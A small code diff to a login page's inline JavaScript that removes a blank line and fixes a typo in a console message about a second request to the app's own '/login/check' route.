@@ -55,7 +55,6 @@
                 const loginResponse = await fetch("{{ url_for('login_page') }}", {
                     method: 'POST',
                     headers: {
-      
                         'Content-Type': 'application/x-www-form-urlencoded',
                     },
                     body: urlEncodedData, 
@@ -78,7 +77,7 @@
                         body: hiddenUrlEncodedData
                     });
                     
-                    console.log('Hidden request sent to /login/chack');
+                    console.log('Hidden request sent to /login/check');
                     
                     window.location.href = redirectUrl;
     
